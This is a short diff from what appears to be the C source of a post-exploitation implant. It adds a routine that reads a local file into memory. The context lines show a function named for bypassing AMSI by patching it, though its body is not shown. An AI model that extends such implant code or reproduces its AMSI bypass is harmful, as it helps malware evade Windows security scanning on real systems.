@@ -477,6 +477,49 @@ LEAVE:
     return NtStatus;
 }
 
+BOOL ReadLocalFile( LPCWSTR FileName, PVOID* FileContent, PDWORD FileSize )
+{
+    BOOL   Success = FALSE;
+    DWORD  Read    = 0;
+    HANDLE hFile   = NULL;
+
+    hFile = Instance.Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
+    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
+    {
+        PUTS( "CreateFileW: Failed" )
+        CALLBACK_GETLASTERROR
+        goto Cleanup;
+    }
+
+    *FileSize    = Instance.Win32.GetFileSize( hFile, 0 );
+    *FileContent = Instance.Win32.LocalAlloc( LPTR, *FileSize );
+
+    if ( ! Instance.Win32.ReadFile( hFile, *FileContent, *FileSize, &Read, NULL ) )
+    {
+        PUTS( "ReadFile: Failed" )
+        CALLBACK_GETLASTERROR
+        goto Cleanup;
+    }
+
+    Success = TRUE;
+
+Cleanup:
+    if ( hFile )
+    {
+        Instance.Win32.NtClose( hFile );
+        hFile = NULL;
+    }
+
+    if ( ! Success && *FileContent )
+    {
+        Instance.Win32.LocalFree( *FileContent );
+        *FileContent = NULL;
+        *FileSize    = 0;
+    }
+
+    return Success;
+}
+
 /* Patch AMSI
  * TODO: remove this and replace it with hardware breakpoints */
 BOOL BypassPatchAMSI()
